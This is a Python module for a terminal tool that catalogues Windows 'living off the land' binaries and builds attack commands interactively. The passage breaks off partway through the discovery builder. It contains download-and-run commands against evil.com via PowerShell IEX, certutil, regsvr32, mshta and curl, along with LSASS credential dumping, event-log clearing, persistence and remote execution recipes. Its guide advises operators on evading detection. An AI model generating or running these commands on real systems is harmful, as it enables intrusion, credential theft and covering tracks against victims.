"""LOLBins and Beyond Reference Module

Living Off The Land Binaries (LOLBins) are legitimate Windows binaries that can be
abused for malicious purposes. This module provides a comprehensive reference of
LOLBins organized by function and MITRE ATT&CK techniques.

Reference: https://github.com/sheimo/awesome-lolbins-and-beyond
"""

import base64
import os
import base64
from typing import Dict, List, Any, Optional
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.table import Table
from rich import box
from rich.text import Text


class LOLBinsDatabase:
    """LOLBins database and reference"""
    
    def __init__(self):
        self.lolbins = self._initialize_database()
    
    def _initialize_database(self) -> Dict[str, Dict[str, Any]]:
        """Initialize LOLBins database"""
        return {
            'Execution': {
                'mshta.exe': {
                    'description': 'Microsoft HTML Application Host - Execute HTA files',
                    'techniques': ['T1218.005'],
                    'examples': [
                        'mshta.exe http://evil.com/payload.hta',
                        'mshta.exe javascript:alert("XSS")',
                        'mshta.exe vbscript:CreateObject("WScript.Shell").Run("cmd.exe")'
                    ],
                    'use_cases': ['Code execution', 'Bypass application whitelisting']
                },
                'rundll32.exe': {
                    'description': 'Execute DLL functions',
                    'techniques': ['T1218.011'],
                    'examples': [
                        'rundll32.exe shell32.dll,ShellExec_RunDLL calc.exe',
                        'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";alert("XSS");',
                        'rundll32.exe advpack.dll,LaunchINFSection calc.inf,DefaultInstall'
                    ],
                    'use_cases': ['DLL execution', 'Code execution', 'Bypass detection']
                },
                'regsvr32.exe': {
                    'description': 'Register DLLs - Can execute DLLs',
                    'techniques': ['T1218.010'],
                    'examples': [
                        'regsvr32.exe /s /n /u /i:http://evil.com/file.sct scrobj.dll',
                        'regsvr32.exe /s /u /i:http://evil.com/file.sct scrobj.dll',
                        'regsvr32.exe /s /n /u /i:file.sct scrobj.dll'
                    ],
                    'use_cases': ['Code execution', 'Bypass application whitelisting']
                },
                'wmic.exe': {
                    'description': 'Windows Management Instrumentation Command-line',
                    'techniques': ['T1047', 'T1569'],
                    'examples': [
                        'wmic process call create "calc.exe"',
                        'wmic /node:target process call create "cmd.exe /c whoami"',
                        'wmic process where name="notepad.exe" delete',
                        'wmic product get name'
                    ],
                    'use_cases': ['Remote execution', 'Process management', 'Discovery']
                },
                'powershell.exe': {
                    'description': 'PowerShell - Script execution engine',
                    'techniques': ['T1059.001'],
                    'examples': [
                        'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString(\'http://evil.com/script.ps1\')"',
                        'powershell.exe -EncodedCommand <base64>',
                        'powershell.exe -File script.ps1',
                        'powershell.exe -Command "Invoke-Expression (Get-Content script.ps1)"'
                    ],
                    'use_cases': ['Code execution', 'Script execution', 'Lateral movement']
                },
                'cmd.exe': {
                    'description': 'Command Prompt',
                    'techniques': ['T1059.003'],
                    'examples': [
                        'cmd.exe /c whoami',
                        'cmd.exe /c "powershell.exe -Command IEX(...)"',
                        'cmd.exe /c start /b calc.exe'
                    ],
                    'use_cases': ['Command execution', 'Process spawning']
                },
                'cscript.exe': {
                    'description': 'Windows Script Host - Execute VBScript/JScript',
                    'techniques': ['T1059.005'],
                    'examples': [
                        'cscript.exe script.vbs',
                        'cscript.exe //E:JScript script.js',
                        'cscript.exe //E:VBScript script.vbs'
                    ],
                    'use_cases': ['Script execution', 'Code execution']
                },
                'wscript.exe': {
                    'description': 'Windows Script Host - Execute scripts',
                    'techniques': ['T1059.005'],
                    'examples': [
                        'wscript.exe script.vbs',
                        'wscript.exe //E:JScript script.js'
                    ],
                    'use_cases': ['Script execution', 'Code execution']
                }
            },
            'Lateral Movement': {
                'psexec.exe': {
                    'description': 'Sysinternals PsExec - Remote execution',
                    'techniques': ['T1021.002'],
                    'examples': [
                        'psexec.exe \\\\target -u user -p pass cmd.exe',
                        'psexec.exe \\\\target -s cmd.exe /c whoami',
                        'psexec.exe \\\\target -h -u user -p pass -d cmd.exe'
                    ],
                    'use_cases': ['Remote execution', 'Lateral movement']
                },
                'sc.exe': {
                    'description': 'Service Control - Manage services',
                    'techniques': ['T1569.002'],
                    'examples': [
                        'sc \\\\target create service binPath= "cmd.exe /c calc.exe"',
                        'sc \\\\target start service',
                        'sc \\\\target stop service',
                        'sc \\\\target delete service'
                    ],
                    'use_cases': ['Remote service creation', 'Lateral movement']
                },
                'wmic.exe': {
                    'description': 'WMI for remote execution',
                    'techniques': ['T1047', 'T1021.006'],
                    'examples': [
                        'wmic /node:target process call create "cmd.exe /c whoami"',
                        'wmic /node:target /user:user /password:pass process call create "calc.exe"',
                        'wmic /node:target process list'
                    ],
                    'use_cases': ['Remote execution', 'Lateral movement']
                },
                'winrs.exe': {
                    'description': 'Windows Remote Shell',
                    'techniques': ['T1021.006'],
                    'examples': [
                        'winrs -r:target -u:user -p:pass cmd.exe',
                        'winrs -r:target cmd.exe /c whoami'
                    ],
                    'use_cases': ['Remote execution', 'Lateral movement']
                },
                'schtasks.exe': {
                    'description': 'Task Scheduler - Create/run tasks',
                    'techniques': ['T1053.005'],
                    'examples': [
                        'schtasks /create /s target /u user /p pass /tn task /tr "cmd.exe /c calc.exe" /sc onstart',
                        'schtasks /run /s target /u user /p pass /tn task',
                        'schtasks /create /tn task /tr "powershell.exe -File script.ps1" /sc daily'
                    ],
                    'use_cases': ['Remote execution', 'Persistence', 'Lateral movement']
                }
            },
            'Credential Access': {
                'mimikatz.exe': {
                    'description': 'Credential extraction tool',
                    'techniques': ['T1003.001'],
                    'examples': [
                        'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"',
                        'mimikatz.exe "lsadump::sam"',
                        'mimikatz.exe "lsadump::secrets"'
                    ],
                    'use_cases': ['Credential dumping', 'LSASS memory access']
                },
                'rundll32.exe': {
                    'description': 'Can be used with comsvcs.dll for LSASS dumping',
                    'techniques': ['T1003.001'],
                    'examples': [
                        'rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump <PID> dump.dmp full',
                        'rundll32.exe comsvcs.dll MiniDump <PID> dump.dmp full'
                    ],
                    'use_cases': ['LSASS dumping', 'Credential extraction']
                },
                'taskmgr.exe': {
                    'description': 'Task Manager - Can dump LSASS',
                    'techniques': ['T1003.001'],
                    'examples': [
                        'Right-click lsass.exe → Create dump file',
                        'Use Task Manager GUI to dump process'
                    ],
                    'use_cases': ['LSASS dumping', 'Credential extraction']
                },
                'procdump.exe': {
                    'description': 'Sysinternals ProcDump - Process dumping',
                    'techniques': ['T1003.001'],
                    'examples': [
                        'procdump.exe -accepteula -ma lsass.exe lsass.dmp',
                        'procdump.exe -ma <PID> process.dmp'
                    ],
                    'use_cases': ['Process dumping', 'LSASS dumping']
                },
                'vaultcmd.exe': {
                    'description': 'Windows Vault credential access',
                    'techniques': ['T1555.003'],
                    'examples': [
                        'vaultcmd /list',
                        'vaultcmd /listcreds:"Windows Credentials"'
                    ],
                    'use_cases': ['Credential access', 'Vault enumeration']
                },
                'cmdkey.exe': {
                    'description': 'Manage stored credentials',
                    'techniques': ['T1555.003'],
                    'examples': [
                        'cmdkey /list',
                        'cmdkey /add:target /user:user /pass:pass'
                    ],
                    'use_cases': ['Credential management', 'Credential access']
                }
            },
            'Discovery': {
                'net.exe': {
                    'description': 'Network commands - Discovery',
                    'techniques': ['T1018', 'T1087', 'T1135'],
                    'examples': [
                        'net view /domain',
                        'net view \\\\target',
                        'net group /domain',
                        'net localgroup administrators',
                        'net user',
                        'net share'
                    ],
                    'use_cases': ['Network discovery', 'Account discovery', 'Share discovery']
                },
                'nltest.exe': {
                    'description': 'Domain trust testing',
                    'techniques': ['T1482'],
                    'examples': [
                        'nltest /dclist:domain',
                        'nltest /domain_trusts',
                        'nltest /dsgetdc:domain'
                    ],
                    'use_cases': ['Domain discovery', 'Trust enumeration']
                },
                'systeminfo.exe': {
                    'description': 'System information',
                    'techniques': ['T1082'],
                    'examples': [
                        'systeminfo',
                        'systeminfo /s target',
                        'systeminfo | findstr /B /C:"OS Name" /C:"OS Version"'
                    ],
                    'use_cases': ['System information discovery']
                },
                'whoami.exe': {
                    'description': 'User identity information',
                    'techniques': ['T1087.001'],
                    'examples': [
                        'whoami',
                        'whoami /all',
                        'whoami /groups',
                        'whoami /priv'
                    ],
                    'use_cases': ['Account discovery', 'Privilege enumeration']
                },
                'quser.exe': {
                    'description': 'Query user sessions',
                    'techniques': ['T1033'],
                    'examples': [
                        'quser',
                        'quser /server:target',
                        'quser /server:target /user:user'
                    ],
                    'use_cases': ['Session discovery']
                },
                'qwinsta.exe': {
                    'description': 'Display session information',
                    'techniques': ['T1033'],
                    'examples': [
                        'qwinsta',
                        'qwinsta /server:target'
                    ],
                    'use_cases': ['Session discovery']
                },
                'arp.exe': {
                    'description': 'ARP cache - Network discovery',
                    'techniques': ['T1018'],
                    'examples': [
                        'arp -a',
                        'arp -a | findstr "192.168"'
                    ],
                    'use_cases': ['Network discovery']
                },
                'ipconfig.exe': {
                    'description': 'Network configuration',
                    'techniques': ['T1018'],
                    'examples': [
                        'ipconfig /all',
                        'ipconfig /displaydns'
                    ],
                    'use_cases': ['Network discovery']
                },
                'nslookup.exe': {
                    'description': 'DNS queries',
                    'techniques': ['T1590.002'],
                    'examples': [
                        'nslookup domain.com',
                        'nslookup -type=MX domain.com'
                    ],
                    'use_cases': ['DNS discovery']
                }
            },
            'Persistence': {
                'schtasks.exe': {
                    'description': 'Scheduled tasks',
                    'techniques': ['T1053.005'],
                    'examples': [
                        'schtasks /create /tn task /tr "cmd.exe /c calc.exe" /sc onlogon',
                        'schtasks /create /tn task /tr "powershell.exe -File script.ps1" /sc daily /st 00:00',
                        'schtasks /run /tn task',
                        'schtasks /delete /tn task /f'
                    ],
                    'use_cases': ['Persistence', 'Scheduled execution']
                },
                'sc.exe': {
                    'description': 'Service creation',
                    'techniques': ['T1543.003'],
                    'examples': [
                        'sc create service binPath= "cmd.exe /c calc.exe" start= auto',
                        'sc config service start= auto',
                        'sc start service'
                    ],
                    'use_cases': ['Persistence', 'Service creation']
                },
                'reg.exe': {
                    'description': 'Registry modification',
                    'techniques': ['T1547.001'],
                    'examples': [
                        'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v key /t REG_SZ /d "cmd.exe /c calc.exe"',
                        'reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v key /t REG_SZ /d "powershell.exe -File script.ps1"',
                        'reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
                    ],
                    'use_cases': ['Persistence', 'Registry run keys']
                },
                'wmic.exe': {
                    'description': 'WMI event subscriptions',
                    'techniques': ['T1053.003'],
                    'examples': [
                        'wmic /namespace:\\\\root\\subscription PATH __EventFilter Create',
                        'wmic /namespace:\\\\root\\subscription PATH __EventConsumer Create',
                        'wmic /namespace:\\\\root\\subscription PATH __FilterToConsumerBinding Create'
                    ],
                    'use_cases': ['Persistence', 'WMI event subscriptions']
                }
            },
            'Defense Evasion': {
                'certutil.exe': {
                    'description': 'Certificate utility - Can download/encode files',
                    'techniques': ['T1105', 'T1027'],
                    'examples': [
                        'certutil.exe -urlcache -split -f http://evil.com/file.exe file.exe',
                        'certutil.exe -encode file.exe file.b64',
                        'certutil.exe -decode file.b64 file.exe',
                        'certutil.exe -dump file.exe'
                    ],
                    'use_cases': ['File download', 'Obfuscation', 'Bypass detection']
                },
                'bitsadmin.exe': {
                    'description': 'Background Intelligent Transfer Service',
                    'techniques': ['T1105'],
                    'examples': [
                        'bitsadmin /transfer job http://evil.com/file.exe C:\\temp\\file.exe',
                        'bitsadmin /create job',
                        'bitsadmin /addfile job http://evil.com/file.exe C:\\temp\\file.exe',
                        'bitsadmin /resume job'
                    ],
                    'use_cases': ['File download', 'Bypass detection']
                },
                'curl.exe': {
                    'description': 'Download files',
                    'techniques': ['T1105'],
                    'examples': [
                        'curl.exe http://evil.com/file.exe -o file.exe',
                        'curl.exe -s http://evil.com/script.ps1 | powershell.exe'
                    ],
                    'use_cases': ['File download']
                },
                'wget.exe': {
                    'description': 'Download files',
                    'techniques': ['T1105'],
                    'examples': [
                        'wget.exe http://evil.com/file.exe -O file.exe'
                    ],
                    'use_cases': ['File download']
                },
                'findstr.exe': {
                    'description': 'Search strings - Can be used for file operations',
                    'techniques': ['T1083'],
                    'examples': [
                        'findstr /s /i password *.txt',
                        'findstr /s /i "password" C:\\Users\\*.txt'
                    ],
                    'use_cases': ['File search', 'Credential hunting']
                },
                'wevtutil.exe': {
                    'description': 'Event log utility',
                    'techniques': ['T1070.001'],
                    'examples': [
                        'wevtutil.exe cl Security',
                        'wevtutil.exe cl System',
                        'wevtutil.exe cl Application',
                        'wevtutil.exe qe Security /c:1'
                    ],
                    'use_cases': ['Log clearing', 'Defense evasion']
                },
                'bcdedit.exe': {
                    'description': 'Boot configuration - Can disable security',
                    'techniques': ['T1562.009'],
                    'examples': [
                        'bcdedit.exe /set {current} bootstatuspolicy ignoreallfailures',
                        'bcdedit.exe /set {current} recoveryenabled no'
                    ],
                    'use_cases': ['Disable recovery', 'Defense evasion']
                }
            },
            'Collection': {
                'robocopy.exe': {
                    'description': 'Robust file copy',
                    'techniques': ['T1030'],
                    'examples': [
                        'robocopy C:\\Users\\user\\Documents \\\\target\\share\\docs /E',
                        'robocopy C:\\Data \\\\target\\share /MIR'
                    ],
                    'use_cases': ['Data collection', 'File exfiltration']
                },
                'xcopy.exe': {
                    'description': 'Extended copy',
                    'techniques': ['T1030'],
                    'examples': [
                        'xcopy C:\\Users\\user\\Documents \\\\target\\share\\docs /E /I',
                        'xcopy C:\\Data \\\\target\\share /E /Y'
                    ],
                    'use_cases': ['Data collection', 'File exfiltration']
                },
                'copy.exe': {
                    'description': 'File copy',
                    'techniques': ['T1030'],
                    'examples': [
                        'copy file.txt \\\\target\\share\\file.txt',
                        'copy C:\\Users\\*.txt \\\\target\\share\\'
                    ],
                    'use_cases': ['File copy', 'Data collection']
                }
            }
        }
    
    def search(self, query: str) -> List[Dict[str, Any]]:
        """Search LOLBins by name or description"""
        results = []
        query_lower = query.lower()
        
        for category, bins in self.lolbins.items():
            for name, info in bins.items():
                if query_lower in name.lower() or query_lower in info['description'].lower():
                    results.append({
                        'category': category,
                        'name': name,
                        'info': info
                    })
        
        return results
    
    def get_by_category(self, category: str) -> Dict[str, Any]:
        """Get all LOLBins in a category"""
        return self.lolbins.get(category, {})
    
    def get_bin(self, name: str) -> Optional[Dict[str, Any]]:
        """Get specific LOLBin information"""
        for category, bins in self.lolbins.items():
            if name in bins:
                return bins[name]
        return None
    
    def get_categories(self) -> List[str]:
        """Get all categories"""
        return list(self.lolbins.keys())


class LOLBinsModule:
    """LOLBins Reference Module for TUI"""
    
    def __init__(self):
        self.database = LOLBinsDatabase()
    
    def run(self, console: Console, session_data: dict):
        """Run LOLBins module"""
        while True:
            console.print(Panel(
                "[bold]LOLBins and Beyond Reference[/bold]\n\n"
                "Living Off The Land Binaries - Legitimate Windows tools for lateral movement.",
                title="Module 9",
                border_style="cyan"
            ))
            console.print()
            
            table = Table(box=box.SIMPLE, show_header=False)
            table.add_column("Option", style="cyan", width=3)
            table.add_column("Function", style="white")
            
            table.add_row("1", "Search LOLBins")
            table.add_row("2", "Browse by Category")
            table.add_row("3", "Execution LOLBins")
            table.add_row("4", "Lateral Movement LOLBins")
            table.add_row("5", "Credential Access LOLBins")
            table.add_row("6", "Discovery LOLBins")
            table.add_row("7", "Persistence LOLBins")
            table.add_row("8", "Defense Evasion LOLBins")
            table.add_row("9", "Collection LOLBins")
            table.add_row("10", "Build Command Dynamically")
            table.add_row("?", "Module Guide - Usage instructions and TTPs")
            table.add_row("0", "Return to main menu")
            
            console.print(table)
            console.print()
            
            choice = Prompt.ask("Select function", choices=['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '?'], default='0')
            
            if choice == '0':
                break
            elif choice == '?':
                self._show_guide(console)
            elif choice == '1':
                self._search_lolbins(console)
            elif choice == '2':
                self._browse_category(console)
            elif choice == '3':
                self._show_category(console, 'Execution')
            elif choice == '4':
                self._show_category(console, 'Lateral Movement')
            elif choice == '5':
                self._show_category(console, 'Credential Access')
            elif choice == '6':
                self._show_category(console, 'Discovery')
            elif choice == '7':
                self._show_category(console, 'Persistence')
            elif choice == '8':
                self._show_category(console, 'Defense Evasion')
            elif choice == '9':
                self._show_category(console, 'Collection')
            elif choice == '10':
                self._build_command(console, session_data)
            
            console.print()
    
    def _show_guide(self, console: Console):
        """Show module guide"""
        guide_text = """[bold cyan]LOLBins Reference Module Guide[/bold cyan]

[bold]Purpose:[/bold]
Living Off The Land Binaries - Reference database of legitimate Windows tools for lateral movement and operations.

[bold]Key Functions:[/bold]
1. Search LOLBins - Search for specific binaries
2. Browse by Category - Browse by MITRE ATT&CK category
3-9. Category Views - Execution, Lateral Movement, Credential Access, etc.
10. Build Command Dynamically - Construct commands with parameters

[bold]MITRE ATT&CK TTPs:[/bold]
• T1218 - Signed Binary Proxy Execution
• T1059 - Command and Scripting Interpreter
• T1105 - Ingress Tool Transfer
• T1021 - Remote Services
• T1003 - OS Credential Dumping

[bold]Usage Tips:[/bold]
• Use option 1 to find specific tools quickly
• Browse categories (options 3-9) to discover tools by purpose
• Option 10 helps build commands with proper syntax
• All tools are legitimate Windows binaries
• Using LOLBins helps avoid detection

[bold]Best Practices:[/bold]
• Prefer native Windows tools over custom tools
• Use tools that blend with normal admin activity
• Document which tools you use for OPSEC
• Test commands in lab environment first"""
        
        console.print(Panel(guide_text, title="Module Guide", border_style="cyan"))
        console.print()
        Prompt.ask("[dim]Press Enter to continue[/dim]", default="")
    
    def _search_lolbins(self, console: Console):
        """Search LOLBins"""
        console.print("\n[bold cyan]Search LOLBins[/bold cyan]\n")
        
        query = Prompt.ask("Search query")
        results = self.database.search(query)
        
        if not results:
            console.print("[yellow]No results found[/yellow]")
            return
        
        console.print(f"\n[green]Found {len(results)} result(s):[/green]\n")
        
        for result in results:
            self._display_bin(console, result['name'], result['info'], result['category'])
    
    def _browse_category(self, console: Console):
        """Browse by category"""
        console.print("\n[bold cyan]Browse by Category[/bold cyan]\n")
        
        categories = self.database.get_categories()
        category = Prompt.ask("Category", choices=categories)
        
        self._show_category(console, category)
    
    def _show_category(self, console: Console, category: str):
        """Show LOLBins in a category"""
        console.print(f"\n[bold cyan]{category} LOLBins[/bold cyan]\n")
        
        bins = self.database.get_by_category(category)
        if not bins:
            console.print("[yellow]No LOLBins in this category[/yellow]")
            return
        
        # Show list
        table = Table(title=f"{category} LOLBins", box=box.ROUNDED)
        table.add_column("Binary", style="cyan")
        table.add_column("Description", style="white")
        table.add_column("Techniques", style="dim white")
        
        for name, info in bins.items():
            techniques = ', '.join(info.get('techniques', []))
            table.add_row(name, info['description'][:60], techniques)
        
        console.print(table)
        
        # Show details for selected bin
        if Confirm.ask("\n[bold]View details for a binary?[/bold]", default=False):
            bin_name = Prompt.ask("Binary name", choices=list(bins.keys()))
            self._display_bin(console, bin_name, bins[bin_name], category)
    
    def _display_bin(self, console: Console, name: str, info: Dict[str, Any], category: str):
        """Display detailed information about a LOLBin"""
        console.print(f"\n[bold cyan]{name}[/bold cyan] - {category}\n")
        console.print(f"[bold]Description:[/bold] {info['description']}\n")
        
        if info.get('techniques'):
            console.print(f"[bold]MITRE ATT&CK Techniques:[/bold] {', '.join(info['techniques'])}\n")
        
        if info.get('use_cases'):
            console.print("[bold]Use Cases:[/bold]")
            for use_case in info['use_cases']:
                console.print(f"  • {use_case}")
            console.print()
        
        if info.get('examples'):
            console.print("[bold]Examples:[/bold]")
            for i, example in enumerate(info['examples'], 1):
                console.print(f"  {i}. [cyan]{example}[/cyan]")
            console.print()
    
    def _build_command(self, console: Console, session_data: dict):
        """Build command dynamically based on use case"""
        console.print("\n[bold cyan]Dynamic Command Builder[/bold cyan]\n")
        
        # Show use cases
        use_cases = {
            '1': ('Execute Code Remotely', 'lateral'),
            '2': ('Execute Code Locally', 'execution'),
            '3': ('Dump Credentials', 'credential'),
            '4': ('Discover Network/Systems', 'discovery'),
            '5': ('Establish Persistence', 'persistence'),
            '6': ('Download File', 'evasion'),
            '7': ('Clear Logs', 'evasion'),
            '8': ('Copy Files', 'collection'),
            '9': ('Sign File with Certificate', 'evasion')
        }
        
        table = Table(title="Use Cases", box=box.ROUNDED)
        table.add_column("Option", style="cyan")
        table.add_column("Use Case", style="white")
        table.add_column("Category", style="dim white")
        
        for key, (use_case, category) in use_cases.items():
            table.add_row(key, use_case, category)
        
        console.print(table)
        console.print()
        
        use_case_choice = Prompt.ask("Select use case", choices=list(use_cases.keys()))
        use_case_name, category = use_cases[use_case_choice]
        
        console.print(f"\n[bold]Building command for: {use_case_name}[/bold]\n")
        
        # Route to appropriate builder
        if category == 'lateral':
            self._build_lateral_command(console, session_data)
        elif category == 'execution':
            self._build_execution_command(console, session_data)
        elif category == 'credential':
            self._build_credential_command(console, session_data)
        elif category == 'discovery':
            self._build_discovery_command(console, session_data)
        elif category == 'persistence':
            self._build_persistence_command(console, session_data)
        elif category == 'evasion':
            if use_case_name == 'Sign File with Certificate':
                self._build_certificate_signing_command(console, session_data)
            else:
                self._build_evasion_command(console, session_data, use_case_name)
        elif category == 'collection':
            self._build_collection_command(console, session_data)
    
    def _build_lateral_command(self, console: Console, session_data: dict):
        """Build lateral movement command"""
        console.print("[bold]Lateral Movement Command Builder[/bold]\n")
        
        method = Prompt.ask(
            "Method",
            choices=['psexec', 'sc', 'wmic', 'winrs', 'schtasks'],
            default='wmic'
        )
        
        target = Prompt.ask("Target hostname or IP")
        
        # Validate target if LAB_USE=1
        lab_use = session_data.get('LAB_USE', 0)
        if lab_use == 1:
            from modules.utils import validate_target
            valid, error = validate_target(target, lab_use)
            if not valid:
                console.print(f"[red]{error}[/red]")
                return
        
        command = Prompt.ask("Command to execute", default="whoami")
        
        if method == 'psexec':
            username = Prompt.ask("Username (optional)", default="")
            password = Prompt.ask("Password (optional)", default="", password=True)
            
            if username and password:
                cmd = f'psexec.exe \\\\{target} -u {username} -p {password} {command}'
            elif username:
                cmd = f'psexec.exe \\\\{target} -u {username} {command}'
            else:
                cmd = f'psexec.exe \\\\{target} {command}'
            
            if Confirm.ask("Run as SYSTEM?", default=False):
                cmd = cmd.replace('psexec.exe', 'psexec.exe -s')
        
        elif method == 'sc':
            service_name = Prompt.ask("Service name", default="TestService")
            action = Prompt.ask("Action", choices=['create', 'start', 'stop', 'delete'], default='create')
            
            if action == 'create':
                cmd = f'sc \\\\{target} create {service_name} binPath= "{command}"'
            elif action == 'start':
                cmd = f'sc \\\\{target} start {service_name}'
            elif action == 'stop':
                cmd = f'sc \\\\{target} stop {service_name}'
            else:
                cmd = f'sc \\\\{target} delete {service_name}'
        
        elif method == 'wmic':
            username = Prompt.ask("Username (optional)", default="")
            password = Prompt.ask("Password (optional)", default="", password=True)
            
            if username and password:
                cmd = f'wmic /node:{target} /user:{username} /password:{password} process call create "{command}"'
            else:
                cmd = f'wmic /node:{target} process call create "{command}"'
        
        elif method == 'winrs':
            username = Prompt.ask("Username (optional)", default="")
            password = Prompt.ask("Password (optional)", default="", password=True)
            
            if username and password:
                cmd = f'winrs -r:{target} -u:{username} -p:{password} {command}'
            else:
                cmd = f'winrs -r:{target} {command}'
        
        elif method == 'schtasks':
            task_name = Prompt.ask("Task name", default="UpdateTask")
            username = Prompt.ask("Username (optional)", default="")
            password = Prompt.ask("Password (optional)", default="", password=True)
            schedule = Prompt.ask("Schedule", choices=['onstart', 'onlogon', 'daily', 'once'], default='onstart')
            
            auth_part = ""
            if username and password:
                auth_part = f' /u {username} /p {password}'
            
            cmd = f'schtasks /create /s {target}{auth_part} /tn {task_name} /tr "{command}" /sc {schedule}'
            
            if Confirm.ask("Run task immediately?", default=False):
                run_cmd = f'schtasks /run /s {target}{auth_part} /tn {task_name}'
                console.print(f"\n[green]Created task command:[/green] {cmd}")
                console.print(f"[green]Run task command:[/green] {run_cmd}")
                cmd = f"{cmd}\n{run_cmd}"
        
        self._display_generated_command(console, cmd, method, session_data)
    
    def _build_execution_command(self, console: Console, session_data: dict):
        """Build local execution command"""
        console.print("[bold]Local Execution Command Builder[/bold]\n")
        
        method = Prompt.ask(
            "Execution method",
            choices=['powershell', 'cmd', 'mshta', 'rundll32', 'regsvr32', 'wmic', 'cscript'],
            default='powershell'
        )
        
        if method == 'powershell':
            execution_type = Prompt.ask(
                "Execution type",
                choices=['command', 'file', 'encoded', 'download'],
                default='command'
            )
            
            if execution_type == 'command':
                ps_cmd = Prompt.ask("PowerShell command", default="Get-Process")
                cmd = f'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "{ps_cmd}"'
            
            elif execution_type == 'file':
                script_path = Prompt.ask("Script path", default="script.ps1")
                cmd = f'powershell.exe -NoProfile -ExecutionPolicy Bypass -File "{script_path}"'
            
            elif execution_type == 'encoded':
                ps_cmd = Prompt.ask("PowerShell command", default="Get-Process")
                encoded = base64.b64encode(ps_cmd.encode('utf-16-le')).decode('ascii')
                cmd = f'powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded}'
                console.print(f"[dim]Base64 encoded: {encoded}[/dim]\n")
            
            elif execution_type == 'download':
                url = Prompt.ask("Script URL", default="http://evil.com/script.ps1")
                cmd = f'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString(\'{url}\')"'
        
        elif method == 'cmd':
            cmd_text = Prompt.ask("Command", default="whoami")
            cmd = f'cmd.exe /c {cmd_text}'
        
        elif method == 'mshta':
            hta_type = Prompt.ask("HTA source", choices=['url', 'file', 'javascript'], default='url')
            
            if hta_type == 'url':
                url = Prompt.ask("HTA URL", default="http://evil.com/payload.hta")
                cmd = f'mshta.exe {url}'
            elif hta_type == 'file':
                file_path = Prompt.ask("HTA file path", default="payload.hta")
                cmd = f'mshta.exe {file_path}'
            else:
                js_code = Prompt.ask("JavaScript code", default='alert("XSS")')
                cmd = f'mshta.exe javascript:{js_code}'
        
        elif method == 'rundll32':
            dll = Prompt.ask("DLL", default="shell32.dll")
            function = Prompt.ask("Function", default="ShellExec_RunDLL")
            argument = Prompt.ask("Argument", default="calc.exe")
            cmd = f'rundll32.exe {dll},{function} {argument}'
        
        elif method == 'regsvr32':
            url = Prompt.ask("SCT file URL", default="http://evil.com/file.sct")
            cmd = f'regsvr32.exe /s /n /u /i:{url} scrobj.dll'
        
        elif method == 'wmic':
            command = Prompt.ask("Command to execute", default="calc.exe")
            cmd = f'wmic process call create "{command}"'
        
        elif method == 'cscript':
            script_path = Prompt.ask("Script path", default="script.vbs")
            cmd = f'cscript.exe {script_path}'
        
        self._display_generated_command(console, cmd, method, session_data)
    
    def _build_credential_command(self, console: Console, session_data: dict):
        """Build credential access command"""
        console.print("[bold]Credential Access Command Builder[/bold]\n")
        
        method = Prompt.ask(
            "Method",
            choices=['rundll32_lsass', 'procdump', 'taskmgr', 'vaultcmd', 'cmdkey'],
            default='rundll32_lsass'
        )
        
        if method == 'rundll32_lsass':
            pid = Prompt.ask("LSASS PID (optional, leave empty to find)", default="")
            dump_file = Prompt.ask("Dump file path", default="lsass.dmp")
            
            if not pid:
                console.print("[yellow]Finding LSASS PID...[/yellow]")
                cmd = f'rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump <PID> {dump_file} full'
                console.print("[dim]Note: Replace <PID> with actual LSASS PID[/dim]")
            else:
                cmd = f'rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump {pid} {dump_file} full'
        
        elif method == 'procdump':
            pid = Prompt.ask("LSASS PID (optional)", default="")
            dump_file = Prompt.ask("Dump file path", default="lsass.dmp")
            
            if pid:
                cmd = f'procdump.exe -accepteula -ma {pid} {dump_file}'
            else:
                cmd = f'procdump.exe -accepteula -ma lsass.exe {dump_file}'
        
        elif method == 'taskmgr':
            console.print("[yellow]Manual process:[/yellow]")
            console.print("1. Open Task Manager")
            console.print("2. Right-click lsass.exe")
            console.print("3. Select 'Create dump file'")
            cmd = "[Manual] Task Manager → lsass.exe → Create dump file"
        
        elif method == 'vaultcmd':
            vault_type = Prompt.ask("Vault type", choices=['list', 'credentials'], default='list')
            
            if vault_type == 'list':
                cmd = 'vaultcmd /list'
            else:
                vault_name = Prompt.ask("Vault name", default="Windows Credentials")
                cmd = f'vaultcmd /listcreds:"{vault_name}"'
        
        elif method == 'cmdkey':
            action = Prompt.ask("Action", choices=['list', 'add'], default='list')
            
            if action == 'list':
                cmd = 'cmdkey /list'
            else:
                target = Prompt.ask("Target", default="target:445")
                username = Prompt.ask("Username", default="user")
                password = Prompt.ask("Password", default="", password=True)
                cmd = f'cmdkey /add:{target} /user:{username} /pass:{password}'
        
        self._display_generated_command(console, cmd, method, session_data)
    
    def _build_discovery_command(self, console: Console, session_data: dict):
        """Build discovery command"""
        console.print("[bold]Discovery Command Builder[/bold]\n")
        
        method = Prompt.ask(
            "Discovery type",
            choices=['network', 'accounts', 'system', 'sessions', 'shares', 'domain'],
            default='network'
        )
        
        if method == 'network':
            tool = Prompt.ask("Tool", choices=['net', 'arp', 'ipconfig', 'nslookup'], default='net')
            
            if tool == 'net':
                scope = Prompt.ask("Scope", choices=['domain', 'target', 'local'], default='domain')
                
                if scope == 'domain':
                    cmd = 'net view /domain'
                elif scope == 'target':
                    target = Prompt.ask("Target hostname", default="server")
                    cmd = f'net view \\\\{target}'
                else:
                    cmd = 'net view'
            
            elif tool == 'arp':
                cmd = 'arp -a'
            
            elif tool == 'ipconfig':
                detail = Prompt.ask("Detail level", choices=['basic', 'all', 'dns'], default='all')
                
                if detail == 'all':
                    cmd = 'ipconfig /all'
                elif detail == 'dns':
                    cmd = 'ipconfig /displaydns'
                else:
                    cmd = 'ipconfig'
            
            elif tool == 'nslookup':
